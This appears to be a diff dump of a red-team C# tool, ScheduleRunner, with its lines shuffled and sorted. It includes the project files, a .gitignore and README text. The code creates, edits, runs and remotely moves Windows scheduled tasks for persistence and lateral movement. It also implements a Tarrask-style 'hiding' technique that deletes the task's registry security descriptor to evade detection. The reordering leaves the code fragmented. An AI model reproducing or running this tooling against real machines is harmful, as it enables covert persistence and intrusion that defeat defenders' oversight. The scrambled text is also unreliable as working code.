@@ -1,0 +1,1467 @@
+        
+            
+                
+                                                                               
+                                    break
+                                    daysofweek 
+                                    execAction.Arguments = argument
+                                    execAction.Path = program
+                                    return
+                                DailyTrigger dt = new DailyTrigger()
+                                dt.DaysInterval = 1
+                                dt.StartBoundary = DateTime.Today 
+                                else if (user == null 
+                                if (action is ExecAction execAction 
+                                if (action is ExecAction execAction)
+                                if (user != null 
+                                int hour = Int16.Parse(startTime.Split(':')[0])
+                                int minute = Int16.Parse(startTime.Split(':')[1])
+                                return
+                                string userOnTrigger = (array.Length > 1) 
+                                string[] array = logonTrigger.UserId.Split('
+                                td.Triggers.Add(dt)
+                                {
+                                }
+                            HideScheduledTask(taskName)
+                            LogonTrigger lt = new LogonTrigger()
+                            catch (FormatException)
+                            foreach (LogonTrigger logonTrigger in td.Triggers.OfType<LogonTrigger>())
+                            foreach (Microsoft.Win32.TaskScheduler.Action action in td.Actions)
+                            if (execActions > 1)
+                            if (startTime == null)
+                            int execActions = td.Actions.OfType<ExecAction>().Count()
+                            lt.UserId = user 
+                            return
+                            return null
+                            switch (day.ToLower())
+                            td.Triggers.Add(lt)
+                            try
+                            {
+                            }
+                        // Start deleting the task
+                        DailyTrigger dt = new DailyTrigger()
+                        DaysOfTheWeek daysofweek = 0
+                        HideScheduledTask(taskName)
+                        WeeklyTrigger dt = new WeeklyTrigger()
+                        dt.DaysInterval = 1
+                        dt.DaysOfWeek = daysofweek
+                        dt.StartBoundary = DateTime.Today 
+                        else
+                        folder 
+                        folder = folder 
+                        folder = folder.Remove(folder.Length - 1)
+                        foreach (string day in daysofweekmodifier)
+                        hide = true
+                        if (CheckIsHiddenScheduledTask(taskName))
+                        if (daysofweek == 0)
+                        if (e is UnauthorizedAccessException)
+                        if (index < 1 
+                        if (oldAction == null)
+                        if (ts == null)
+                        int actions = td.Actions.Count()
+                        int hour = Int16.Parse(startTime.Split(':')[0])
+                        int insertIndex = index - 1
+                        int minute = Int16.Parse(startTime.Split(':')[1])
+                        return
+                        return null
+                        td.Triggers.Add(dt)
+                        ts = GetRemoteTaskService(remoteServer)
+                        ts = new TaskService()
+                        ts.RootFolder.DeleteTask(taskName)
+                        tt.Repetition.Interval = TimeSpan.FromHours(Int16.Parse(modifier))
+                        tt.Repetition.Interval = TimeSpan.FromMinutes(Int16.Parse(modifier))
+                        user = WindowsIdentity.GetCurrent().Name
+                        {
+                        }
+                    BootTrigger bt = new BootTrigger()
+                    Helper.PrintHelp()
+                    IdleTrigger it = new IdleTrigger()
+                    ListAllFolders(remoteServer)
+                    LogonTrigger lt = new LogonTrigger()
+                    RemoveHiddenScheduledTask(taskName)
+                    Task task = ts.GetTask(taskName)
+                    TaskDefinition td = task.Definition
+                    TimeTrigger tt = new TimeTrigger()
+                    bool folderIsExist
+                    bool folderIsExist = true
+                    catch (Exception e)
+                    catch (FormatException)
+                    else
+                    else if (!CheckIsSystem())
+                    folder 
+                    folder = folder 
+                    if (!folderIsExist)
+                    if (Int16.Parse(modifier) <= 1439)
+                    if (Int16.Parse(modifier) <= 23)
+                    if (hide)
+                    if (modifier == null)
+                    if (order != null)
+                    if (order == null)
+                    if (remoteServer != null)
+                    if (startTime == null)
+                    if (trigger != null)
+                    if (ts == null)
+                    if (user == null)
+                    lt.UserId = user
+                    return
+                    return false
+                    return null
+                    return true
+                    return ts
+                    t.Run()
+                    taskName = folder 
+                    td.Triggers.Add(bt)
+                    td.Triggers.Add(it)
+                    td.Triggers.Add(lt)
+                    td.Triggers.Add(tt)
+                    try
+                    ts = GetRemoteTaskService(remoteServer)
+                    ts = new TaskService()
+                    {
+                    }
+                // Add command line argument
+                // Check if the folder exists
+                // Check if the newly created scheduled task exists
+                // Check if the task exists
+                // Check key parameters
+                // Check technique - hiding scheduled task
+                // Define trigger
+                // Register the task in the root folder
+                // Setting for the scheduled task
+                // Specific user who executes the scheduled task
+                // Validate remote access
+                </xs:annotation>
+                <xs:annotation>
+                <xs:documentation>Controls if .pdbs for reference assemblies are also embedded.</xs:documentation>
+                <xs:documentation>Controls if runtime assemblies are also embedded.</xs:documentation>
+                <xs:documentation>Controls whether the runtime assemblies are embedded with their full path or only with their assembly name.</xs:documentation>
+                <xs:documentation>Costura by default will load as part of the module initialization. This flag disables that behavior. Make sure you call CosturaUtility.Initialize() somewhere in your code.</xs:documentation>
+                <xs:documentation>Costura will by default use assemblies with a name like 'resources.dll' as a satellite resource and prepend the output path. This flag disables that behavior.</xs:documentation>
+                <xs:documentation>This will copy embedded files to disk before loading them into memory. This is helpful for some scenarios that expected an assembly to be loaded from a physical file.</xs:documentation>
+                Console.WriteLine(sfld.Path)
+                File.Delete(pathToDelete)
+                Helper.PrintHelp()
+                ListSubFolders(sfld)
+                Task t = ts.GetTask(taskName)
+                TaskDefinition td = ts.NewTask()
+                TaskService ts
+                TaskService ts = new TaskService(remoteServer)
+                bool folderIsExist
+                bool folderIsExist = true
+                catch (Exception)
+                else
+                else if (!CheckIsSystem())
+                else if (e is COMException)
+                else if (e is DirectoryNotFoundException)
+                for (int i = 0
+                if (!folderIsExist)
+                if (CheckIsHiddenScheduledTask(taskName))
+                if (argsParam == null)
+                if (e is IOException)
+                if (e is UnauthorizedAccessException 
+                if (e is UnauthorizedAccessException)
+                if (folder != null)
+                if (hide)
+                if (remoteServer != null)
+                if (sd == null)
+                if (taskName == null 
+                if (taskSubKey != null)
+                if (treeSubKey == null)
+                if (ts == null)
+                if(e is UnauthorizedAccessException 
+                return
+                return false
+                return null
+                return ret
+                return true
+                return ts
+                taskName = folder 
+                td.Principal.UserId = user
+                td.RegistrationInfo.Author = author
+                td.RegistrationInfo.Description = description
+                td.Settings.DisallowStartIfOnBatteries = false
+                td.Settings.Enabled = true
+                td.Settings.StopIfGoingOnBatteries = false
+                try
+                ts = GetRemoteTaskService(remoteServer)
+                ts = new TaskService()
+                {
+                }
+              </xs:annotation>
+              </xs:element>
+              <xs:annotation>
+            // Avoid redirecting to syswow64
+            // Check if the folder exists
+            // Check key parameters
+            // Check key paramters
+            // Execute the task if exists
+            // Validate remote access
+            // Validate setup for removing hidden scheduled task
+            </xs:all>
+            </xs:attribute>
+            <xs:all>
+            Helper.Banner()
+            IntPtr val = IntPtr.Zero
+            ListSubFolders(ts.RootFolder)
+            RegistryKey treeSubKey
+            Task t = ts.GetTask(taskName)
+            TaskFolder tf = ts.GetFolder(folder)
+            TaskService ts
+            Wow64DisableWow64FsRedirection(ref val)
+            catch (Exception e)
+            catch (Exception)
+            catch (FileNotFoundException)
+            catch (UnauthorizedAccessException)
+            else
+            foreach (Task t in fld.Tasks)
+            foreach (TaskFolder sfld in fld.SubFolders)
+            foreach (TaskFolder tf in fld.SubFolders)
+            if (args.Length > 0)
+            if (fld == null)
+            if (folder != null)
+            if (hide)
+            if (remoteServer != null)
+            if (remoteServer == null 
+            if (t == null)
+            if (taskName != null)
+            if (taskName == null)
+            if (tf == null)
+            if (trigger == null)
+            if (ts != null)
+            if (ts == null)
+            object sd
+            string currentUser = System.Security.Principal.WindowsIdentity.GetCurrent().Name
+            try
+            {
+            { 
+            }
+          </xs:complexType>
+          <xs:complexType>
+          <xs:documentation>'false' to turn off automatic generation of the XML Schema file.</xs:documentation>
+          <xs:documentation>'true' to run assembly verification (PEVerify) on the target assembly after all weavers have been executed.</xs:documentation>
+          <xs:documentation>A comma-separated list of error codes that can be safely ignored in assembly verification.</xs:documentation>
+        // API used to avoid redirecting to SYSWOW64 folder
+        // Delete hidden scheduled task
+        // Technique - hidding scheduled task
+        // Validate the scheduled task is using 'hide' technique before deletion
+        // https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/
+        </xs:annotation>
+        </xs:element>
+        <xs:annotation>
+        TaskService GetRemoteTaskService(String remoteServer) {
+        bool CheckIsHiddenScheduledTask(String taskName) {
+        bool CheckIsSystem() {
+        private static bool hide = false
+        private static string agrument = null
+        private static string author = null
+        private static string description = null
+        private static string folder = null
+        private static string method = null
+        private static string modifier = null
+        private static string oldAction = null
+        private static string order = null
+        private static string program = null
+        private static string remoteServer = null
+        private static string startTime = null
+        private static string taskName = null
+        private static string trigger = null
+        private static string user = null
+        public static extern int Wow64DisableWow64FsRedirection(ref IntPtr ptr)
+        public static void Banner() {
+        public static void PrintHelp() {
+        static void Main(string[] args) {
+        void HideScheduledTask(String taskName) {
+        void ListAllFolders(String remoteServer) {
+        void ListSubFolders(TaskFolder fld) {
+        void RemoveHiddenScheduledTask(String taskName) {
+        {
+        }
+      </xs:all>
+      </xs:attribute>
+      <HintPath>..
+      <Install>false</Install>
+      <ProductName>.NET Framework 3.5 SP1</ProductName>
+      <Visible>False</Visible>
+      <xs:all>
+    </BootstrapperPackage>
+    </NuGetPackageImportStamp>
+    </PropertyGroup>
+    </Reference>
+    </startup>
+    </xs:complexType>
+    <ApplicationRevision>0</ApplicationRevision>
+    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
+    <AssemblyName>ScheduleRunner</AssemblyName>
+    <BootstrapperEnabled>true</BootstrapperEnabled>
+    <BootstrapperUrlHistory />
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DebugType>none</DebugType>
+    <DefineConstants>DEBUG
+    <DefineConstants>TRACE</DefineConstants>
+    <Deterministic>true</Deterministic>
+    <ErrorReport>prompt</ErrorReport>
+    <ErrorReportUrlHistory />
+    <FallbackCulture>en-US</FallbackCulture>
+    <FileAlignment>512</FileAlignment>
+    <Install>true</Install>
+    <InstallFrom>Disk</InstallFrom>
+    <InstallUrlHistory />
+    <IsWebBootstrapper>false</IsWebBootstrapper>
+    <MapFileExtensions>true</MapFileExtensions>
+    <NuGetPackageImportStamp>
+    <Optimize>false</Optimize>
+    <Optimize>true</Optimize>
+    <OutputPath>bin
+    <OutputType>Exe</OutputType>
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <ProjectGuid>{FF5F7C4C-6915-4C53-9DA3-B8BE6C5F1DB9}</ProjectGuid>
+    <PropertyGroup>
+    <PublishUrl>publish
+    <PublishUrlHistory>publish
+    <RootNamespace>ScheduleRunner</RootNamespace>
+    <SupportUrlHistory />
+    <TargetFrameworkProfile />
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <UpdateEnabled>false</UpdateEnabled>
+    <UpdateInterval>7</UpdateInterval>
+    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
+    <UpdateMode>Foreground</UpdateMode>
+    <UpdatePeriodically>false</UpdatePeriodically>
+    <UpdateRequired>false</UpdateRequired>
+    <UpdateUrlHistory />
+    <UseApplicationTrust>false</UseApplicationTrust>
+    <VerifyUploadedFiles>false</VerifyUploadedFiles>
+    <WarningLevel>4</WarningLevel>
+    <startup> 
+    <xs:complexType>
+    _____      __             __      __     ____                              
+    class Program
+    class TaskManager
+    public class Helper
+    {
+    }
+   / ___/_____/ /_  ___  ____/ /_  __/ /__  / __ 
+  <!-- This file was generated by Fody. Manual changes to this file will be lost when your project is rebuilt. -->
+  </ItemGroup>
+  </PropertyGroup>
+  </Target>
+  </xs:element>
+  <Costura />
+  <ItemGroup>
+  <PropertyGroup>
+  Author: Chris Au                                                             
+  Github: @netero1010                                                          
+  Method 
+ !tools/packages.config
+ (https://github.com/github/gitignore/pull/1529
+ (https://github.com/github/gitignore/pull/2483
+ ------------ 
+ ---------------- 
+ .NET Core
+ /____/
+ /argument 
+ /author 
+ /description 
+ /folder 
+ /modifier 
+ /oldaction 
+ /order 
+ /remoteserver 
+ /starttime 
+ /taskname 
+ /technique 
+ /trigger 
+ /user 
+ 1))
+ ASP.NET Scaffolding
+ AxoCover is a Code Coverage Tool
+ Azure Stream Analytics local run output
+ Backup 
+ Backup folder for Package Reference Convert tool in Visual Studio 2017
+ BeatPulse healthcheck temp database
+ Benchmark Results
+ BizTalk build output
+ Build Results of an ATL Project
+ Build results
+ Business Intelligence projects
+ Cake - Uncomment if you are using it
+ Chutzpah Test files
+ Click-Once directory
+ CodeRush personal settings
+ Create a new scheduled task 
+ Delete an existing scheduled task 
+ Demo
+ Disadvantage of this technique:
+ DocProject is a documentation generator add-in
+ DotCover is a Code Coverage Tool
+ Edit an existing scheduled task 
+ Example
+ Execute an existing scheduled task 
+ FAKE - F
+ Files built by Visual Studio
+ Files/
+ Fody - auto-generated XML schema
+ Function  
+ GhostDoc plugin setting file
+ Guidance Automation Toolkit
+ Hiding Scheduled Task Technique
+ Hiding scheduled task technique 
+ Including strong name files can present a security risk
+ Installshield output folder
+ Ionide (cross platform F
+ JetBrains Rider
+ Library 
+ Library and Reference Used:
+ Link 
+ Local History for Visual Studio
+ Local History for Visual Studio Code
+ MFractors (Xamarin productivity tool) working folder
+ MSBuild Binary and Structured Log
+ MSTest test Results
+ Make
+ Methods (/method):
+ Microsoft Azure Build Output
+ Microsoft Azure Emulator
+ Microsoft Azure Web App publish settings. Comment the next line if you want to
+ Microsoft Fakes
+ MightyMoose
+ Mono auto generated files
+ NCrunch
+ NUnit
+ NVidia Nsight GPU debugger configuration file
+ Node.js Tools for Visual Studio
+ NuGet Packages
+ NuGet Symbol Packages
+ NuGet v3's project.json files produces more ignorable files
+ OpenCover UI analysis results
+ Options for scheduled task creation (/method:create):
+ Options for scheduled task deletion (/method:delete):
+ Options for scheduled task editing (/method:edit):
+ Options for scheduled task execution (/method:run):
+ Options for scheduled task lateral movement (/method:move):
+ Options for scheduled task query (/method:query):
+ Others
+ Paket dependency manager
+ Publish Web Output
+ Python Tools for Visual Studio (PTVS)
+ Query all sub-folders in scheduled task  
+ Query details for a scheduled task or all scheduled tasks under a folder 
+ RIA/Silverlight projects
+ ReSharper is a .NET coding add-in
+ Reference 
+ Run the task with a specified user account 
+ SQL Server files
+ ScheduleRunner - A C
+ Screenshot:
+ SharpPersist 
+ Specify the author of the scheduled task 
+ Specify the command line argument for the program 
+ Specify the description for the scheduled task 
+ Specify the folder where the scheduled task stores (default: 
+ Specify the hostname or IP address of a remote computer 
+ Specify the index in actions in which the new program will be added (1-based) 
+ Specify the name of the scheduled task 
+ Specify the old program that will be replaced with program 
+ Specify the program that the task runs 
+ Specify the program that the task will run 
+ StyleCop
+ TFS 2012 Local Workspace
+ Tabs Studio
+ TaskScheduler 
+ TeamCity is a build add-in
+ Telerik's JustMock configuration file
+ The packages folder can be ignored because of Package Restore
+ TimeSpan.FromHours(hour) 
+ TimeSpan.FromMinutes(minute)
+ Twitter: @netero_1010                                                         
+ Uncomment if necessary however generally it will be regenerated when needed
+ Uncomment if you have tasks that create the project's static files in wwwroot
+ User-specific files
+ User-specific files (MonoDevelop/Xamarin Studio)
+ VS Code files for those working on multiple tools
+ VS Code tools) working folder
+ Version: 1.2                                                                  
+ Visual C
+ Visual Studio 2015/2017 cache/options directory
+ Visual Studio 2017 auto generated files
+ Visual Studio 6 auto-generated project file (contains which files were open etc.)
+ Visual Studio 6 auto-generated workspace file (contains which files were open etc.)
+ Visual Studio 6 build log
+ Visual Studio 6 technical files
+ Visual Studio 6 workspace and project file (working project files containing files to include in project)
+ Visual Studio 6 workspace options file
+ Visual Studio History (VSHistory) files
+ Visual Studio LightSwitch build output
+ Visual Studio Trace Files
+ Visual Studio Version 16
+ Visual Studio cache files
+ Visual Studio code coverage results
+ Visual Studio profiler
+ Web workbench (sass)
+ Windows Installer files from build outputs
+ Windows Store app package directories and files
+ argumentForRemoteServer)
+ array[1] : array[0]
+ because we have git 
+ but database connection strings (with potential passwords) will be unencrypted
+ but keep track of directories ending in .cache
+ cache files
+ create 
+ delete 
+ e is SecurityException)
+ e.Message)
+ edit 
+ files ending in .cache can be ignored
+ fld.SubFolders.Count)
+ fld.Tasks.Count)
+ fld.ToString())
+ https://github.com/dahall/TaskScheduler 
+ https://github.com/mandiant/SharPersist 
+ https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/ 
+ i < args.Length
+ id)
+ in these scripts will be unencrypted
+ index > (actions 
+ move 
+ pathToDelete 
+ program == null)
+ query 
+ queryfolders 
+ remoteServer
+ remoteServer 
+ report files from converting an old project file
+ run 
+ t.Enabled)
+ t.Folder 
+ t.Folder)
+ t.LastRunTime)
+ t.Name 
+ t.Name)
+ t.NextRunTime)
+ t.Path)
+ t.State)
+ t.Xml)
+ taskName
+ taskName 
+ taskName == null 
+ taskName)
+ td.Principal.UserId
+ tf.Path 
+ tf.Path)
+ tool (CobaltStrike execute-assembly friendly) to include the features that I need and provide enough flexibility on customizing the scheduled task.
+ tool with more flexibility to customize scheduled task for both persistence and lateral movement in red team operation
+ tools/
+ treeKey 
+ trigger == null 
+ userOnTrigger.Equals(td.Principal.UserId))
+ userOnTrigger.Equals(user))
+!.axoCover/settings.json
+!.vscode/extensions.json
+!.vscode/launch.json
+!.vscode/settings.json
+!.vscode/tasks.json
+![HowTo](https://github.com/netero1010/ScheduleRunner/raw/main/hiding_scheduled_task.png)
+![HowTo](screenshot.png)
+"                                    Console.WriteLine(""[-] Error: The "
+"                                    Console.WriteLine($""[-] Error: The "
+"                                Console.WriteLine(""[-] Error: The "
+"                                Console.WriteLine(""[-] Error: The task has more than one exec actions. Please specify which one you would like to replace using  "
+"                                Console.WriteLine(""[-] Error: Wrong time format for "
+"                                case ""fri"":"
+"                                case ""friday"":"
+"                                case ""mon"":"
+"                                case ""monday"":"
+"                                case ""sat"":"
+"                                case ""saturday"":"
+"                                case ""sun"":"
+"                                case ""sunday"":"
+"                                case ""thu"":"
+"                                case ""thur"":"
+"                                case ""thurs"":"
+"                                case ""thursday"":"
+"                                case ""tue"":"
+"                                case ""tues"":"
+"                                case ""tuesday"":"
+"                                case ""wed"":"
+"                                case ""wednesday"":"
+"                            Console.WriteLine(""[-] Error: Access is denied."")"
+"                            Console.WriteLine(""[-] Error: Only "
+"                            Console.WriteLine(""[-] Error: The format of the "
+"                            Console.WriteLine(""[-] Error: Unkonwn error while deleting the scheduled task."")"
+"                            Console.WriteLine($""[-] Error: Invalid order. '{order}' is not a valid integer."")"
+"                            Console.WriteLine($""[-] Error: Invalid order. Please enter a value between 1 and {actions "
+"                        Console.WriteLine(""["
+"                        Console.WriteLine(""[-] Error: "" "
+"                        Console.WriteLine(""[-] Error: Technique (hiding scheduled task) does not support remote server since 'Remote Registry' service is ran by Local Service only."")"
+"                        Console.WriteLine(""[-] Error: The folder does not exist."")"
+"                        Console.WriteLine(""[-] Error: The interface is unknown. Probably the Schedule service is down"
+"                        Console.WriteLine(""[-] Error: The modifier for hourly trigger should be lower than 24 hours. Please try again."")"
+"                        Console.WriteLine(""[-] Error: The modifier for minute trigger should be lower than 1439 minutes. Please try again."")"
+"                        Console.WriteLine(""[-] Error: The modifier is not defined. Please try again. For example, use "
+"                        Console.WriteLine(""[-] Error: The scheduled task cannot be deleted."")"
+"                        Console.WriteLine(""[-] Error: The starttime is not defined. Please try again. For example, "
+"                        Console.WriteLine(""[-] Error: The user name could not be found."")"
+"                        Console.WriteLine(""[-] Error: Using technique (hiding scheduled task) requires NT AUTHORITY"
+"                        Console.WriteLine(""[-] Error: Wrong time format for "
+"                        ExecAction newAction = new ExecAction(program, argument, null)"
+"                        List<string> daysofweekmodifier = modifier.Split(',').ToList()"
+"                        else if (trigger.Equals(""onlogon""))"
+"                        folderIsExist = CheckIfFolderExists(ts, folder)"
+"                        folderIsExist = CheckIfFolderExists(ts, folder.Remove(folder.Length - 1))"
+"                        if (!int.TryParse(order, out int index))"
+"                        if (trigger.Equals(""daily""))"
+"                        int.TryParse(order, out int index)"
+"                        td.Actions.Insert(insertIndex, newAction)"
+"                        user = ""NT AUTHORITY"
+"                    Console.WriteLine(""Command to check for task details: ScheduleRunner.exe /method:query /taskname:"
+"                    Console.WriteLine(""["
+"                    Console.WriteLine(""[-] Error: Error when creating the scheduled task. Please check your parameters again."")"
+"                    Console.WriteLine(""[-] Error: Error when editing the scheduled task. Please check your parameters again."")"
+"                    Console.WriteLine(""[-] Error: Error when hiding the scheduled task."")"
+"                    Console.WriteLine(""[-] Error: Missing parameters. "
+"                    Console.WriteLine(""[-] Error: No such schedule type. Please try again."")"
+"                    Console.WriteLine(""[-] Error: Removing hidden scheduled task requires NT AUTHORITY"
+"                    Console.WriteLine(""[-] Error: Technique (hiding scheduled task) does not support remote server since 'Remote Registry' service is ran by Local Service only."")"
+"                    Console.WriteLine(""[-] Error: The '"" "
+"                    Console.WriteLine(""[-] Error: The folder does not exist."")"
+"                    Console.WriteLine(""[-] Error: The path '"" "
+"                    Console.WriteLine(""[-] Error: The path ('"" "
+"                    Console.WriteLine(""[-] Error: The scheduled task cannot be started."")"
+"                    Console.WriteLine(""[-] Error: The scheduled task does not exist."")"
+"                    Console.WriteLine(""[-] Error: Unknown error while deleting the scheduled task on-disk artifact - '"" "
+"                    Console.WriteLine(""[-] Error: Unknown error while deleting the scheduled task."")"
+"                    Console.WriteLine(""[-] Error: Unknown error. The scheduled task was not created."")"
+"                    Console.WriteLine(""[-] Error: Unknown method."")"
+"                    Console.WriteLine(""[-] Error: Unkonwn error while checking the scheduled task via registry."")"
+"                    Console.WriteLine(""[-] Error: You do not have sufficient permission to create the scheduled task."")"
+"                    Console.WriteLine(""[-] Error: You do not have sufficient permission to edit the scheduled task."")"
+"                    Console.WriteLine(""[-] Error: You do not have sufficient permission to hide the scheduled task."")"
+"                    Console.WriteLine(""[-] Error: You do not have sufficient permission to remove the scheduled task."")"
+"                    Console.WriteLine(""[-] Error: You do not have sufficient permission to validate the existence of the scheduled task in registry."")"
+"                    Console.WriteLine(""[-] Error: Your task is not using hidden scheduled task technique. You should remove '/technique:hide' to properly delete the task."")"
+"                    CreateScheduledTask(taskName, folder, author, description, trigger, program, argument, user, modifier, startTime, remoteServer, hide)"
+"                    EditScheduledTask(taskName, folder, program, argument, oldAction, order, trigger, startTime, user, remoteServer, null, hide)"
+"                    LateralMovement(taskName, folder, author, description, trigger, program, argument, user, modifier, startTime, remoteServer)"
+"                    ListScheduledTasks(taskName, folder, remoteServer)"
+"                    ListScheduledTasksInFolder(ts.GetFolder(folder), remoteServer)"
+"                    ListScheduledTasksInFolder(ts.RootFolder, remoteServer)"
+"                    RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).DeleteSubKeyTree(taskKey "
+"                    RemoveScheduledTask(taskName, folder, remoteServer, null, hide)"
+"                    RunScheduledTask(taskName, folder, remoteServer, null)"
+"                    agrument = argsParam[""argument""]"
+"                    argumentForRemoteServer = "" /remoteserver:"" "
+"                    author = argsParam[""author""]"
+"                    description = argsParam[""description""]"
+"                    else if (e.HResult.ToString(""x"") == ""80070534"")"
+"                    folder = argsParam[""folder""]"
+"                    folderIsExist = CheckIfFolderExists(ts, folder)"
+"                    folderIsExist = CheckIfFolderExists(ts, folder.Remove(folder.Length - 1))"
+"                    if (!CheckIfScheduledTaskExists(ts, taskName))"
+"                    if (e.HResult.ToString(""x"") == ""800706b5"")"
+"                    if (folder.EndsWith("""
+"                    if (technique.Contains(""hide""))"
+"                    method = argsParam[""method""]"
+"                    modifier = argsParam[""modifier""]"
+"                    oldAction = argsParam[""oldaction""]"
+"                    order = argsParam[""order""]"
+"                    program = argsParam[""program""]"
+"                    remoteServer = argsParam[""remoteserver""]"
+"                    ret.Add(args[i].Split(':')[0].Remove(0, 1).ToLower(), args[i].Split(new[] { ':' }, 2)[1])"
+"                    startTime = argsParam[""starttime""]"
+"                    string technique = argsParam[""technique""]"
+"                    taskName = argsParam[""taskname""]"
+"                    trigger = argsParam[""trigger""]"
+"                    ts.RootFolder.RegisterTaskDefinition(task.Name, td)"
+"                    user = argsParam[""user""]"
+"                  <xs:documentation>A list of assembly names to exclude from the default action of ""embed all Copy Local references"", delimited with line breaks</xs:documentation>"
+"                  <xs:documentation>A list of assembly names to include from the default action of ""embed all Copy Local references"", delimited with line breaks.</xs:documentation>"
+"                  <xs:documentation>A list of runtime assembly names to exclude from the default action of ""embed all Copy Local references"", delimited with line breaks</xs:documentation>"
+"                  <xs:documentation>A list of runtime assembly names to include from the default action of ""embed all Copy Local references"", delimited with line breaks.</xs:documentation>"
+"                  <xs:documentation>A list of unmanaged 32 bit assembly names to include, delimited with line breaks.</xs:documentation>"
+"                  <xs:documentation>A list of unmanaged 64 bit assembly names to include, delimited with line breaks.</xs:documentation>"
+"                  <xs:documentation>The order of preloaded assemblies, delimited with line breaks.</xs:documentation>"
+"                <xs:documentation>A list of assembly names to exclude from the default action of ""embed all Copy Local references"", delimited with "
+"                <xs:documentation>A list of assembly names to include from the default action of ""embed all Copy Local references"", delimited with "
+"                <xs:documentation>A list of runtime assembly names to exclude from the default action of ""embed all Copy Local references"", delimited with "
+"                <xs:documentation>A list of runtime assembly names to include from the default action of ""embed all Copy Local references"", delimited with "
+"                <xs:documentation>A list of unmanaged 32 bit assembly names to include, delimited with "
+"                <xs:documentation>A list of unmanaged 64 bit assembly names to include, delimited with "
+"                <xs:documentation>As part of Costura, embedded assemblies are no longer included as part of the build. This cleanup can be turned off.</xs:documentation>"
+"                <xs:documentation>Embedded assemblies are compressed by default, and uncompressed when they are loaded. You can turn compression off with this option.</xs:documentation>"
+"                <xs:documentation>The order of preloaded assemblies, delimited with "
+"                Console.WriteLine(""----------------------------------------------------------------------"")"
+"                Console.WriteLine(""Command to check for sub folder details: ScheduleRunner.exe /method:query /folder:"
+"                Console.WriteLine(""Sub folder name: "" "
+"                Console.WriteLine(""Task XML: "
+"                Console.WriteLine(""Task enabled: "" "
+"                Console.WriteLine(""Task folder: "" "
+"                Console.WriteLine(""Task full path: "" "
+"                Console.WriteLine(""Task last run time: "" "
+"                Console.WriteLine(""Task name: "" "
+"                Console.WriteLine(""Task next run time: "" "
+"                Console.WriteLine(""Task state: "" "
+"                Console.WriteLine(""["
+"                Console.WriteLine(""[-] Error: Access is denied."")"
+"                Console.WriteLine(""[-] Error: Missing parameter. "
+"                Console.WriteLine(""[-] Error: Missing parameters. "
+"                Console.WriteLine(""[-] Error: The network path was not found."")"
+"                Console.WriteLine(""[-] Error: The scheduled task does not exist."")"
+"                Console.WriteLine(""[-] Error: This folder cannot be found."")"
+"                Console.WriteLine(""[-] Error: Unknown error while accessing remote server."")"
+"                Console.WriteLine(""[-] Error: Unknown method."")"
+"                Console.WriteLine(""[X] Your command is wrong. Please check help page."")"
+"                Dictionary<string, string> argsParam = Helper.ParseArgs(args)"
+"                Dictionary<string, string> ret = new Dictionary<string, string>()"
+"                ListDetailsForScheduledTask(taskName, folder, remoteServer)"
+"                RegistryKey taskSubKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(taskKey "
+"                RegistryKey treeSubKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(treeKey "
+"                RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).DeleteSubKeyTree(treeKey "
+"                RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(treeKey "
+"                RemoveScheduledTask(taskName, folder, remoteServer, ts, false)"
+"                RunScheduledTask(taskName, folder, remoteServer, ts)"
+"                String argumentForRemoteServer = """""
+"                else if (method.ToLower().Equals(""delete""))"
+"                else if (method.ToLower().Equals(""edit""))"
+"                else if (method.ToLower().Equals(""move""))"
+"                else if (method.ToLower().Equals(""query""))"
+"                else if (method.ToLower().Equals(""queryfolders""))"
+"                else if (method.ToLower().Equals(""run""))"
+"                else if (trigger.Equals(""daily""))"
+"                else if (trigger.Equals(""hourly""))"
+"                else if (trigger.Equals(""minute""))"
+"                else if (trigger.Equals(""onidle""))"
+"                else if (trigger.Equals(""onlogon""))"
+"                else if (trigger.Equals(""onstart""))"
+"                if (CheckIfScheduledTaskExists(ts, taskName))"
+"                if (argsParam.ContainsKey(""argument""))"
+"                if (argsParam.ContainsKey(""author""))"
+"                if (argsParam.ContainsKey(""description""))"
+"                if (argsParam.ContainsKey(""folder""))"
+"                if (argsParam.ContainsKey(""method""))"
+"                if (argsParam.ContainsKey(""modifier""))"
+"                if (argsParam.ContainsKey(""oldaction""))"
+"                if (argsParam.ContainsKey(""order""))"
+"                if (argsParam.ContainsKey(""program""))"
+"                if (argsParam.ContainsKey(""remoteserver""))"
+"                if (argsParam.ContainsKey(""starttime""))"
+"                if (argsParam.ContainsKey(""taskname""))"
+"                if (argsParam.ContainsKey(""technique""))"
+"                if (argsParam.ContainsKey(""trigger""))"
+"                if (argsParam.ContainsKey(""user""))"
+"                if (args[0] == ""/help"" "
+"                if (folder.EndsWith("""
+"                if (method.ToLower().Equals(""create""))"
+"                if (t.Folder.ToString() == """
+"                if (trigger.Equals(""weekly""))"
+"                new TaskManager(method, taskName, folder, author, description, trigger, program, agrument, oldAction, order, user, modifier, startTime, remoteServer, hide)"
+"                object id = treeSubKey.GetValue(""Id"")"
+"                sd = treeSubKey.GetValue(""SD"")"
+"                td.Actions.Add(program, argument, null)"
+"                treeSubKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(treeKey "
+"                trigger = ""onlogon"""
+"                ts.RootFolder.RegisterTaskDefinition(taskName, td)"
+"              <xs:element minOccurs=""0"" maxOccurs=""1"" name=""ExcludeAssemblies"" type=""xs:string"">"
+"              <xs:element minOccurs=""0"" maxOccurs=""1"" name=""ExcludeRuntimeAssemblies"" type=""xs:string"">"
+"              <xs:element minOccurs=""0"" maxOccurs=""1"" name=""IncludeAssemblies"" type=""xs:string"">"
+"              <xs:element minOccurs=""0"" maxOccurs=""1"" name=""IncludeRuntimeAssemblies"" type=""xs:string"">"
+"              <xs:element minOccurs=""0"" maxOccurs=""1"" name=""PreloadOrder"" type=""xs:string"">"
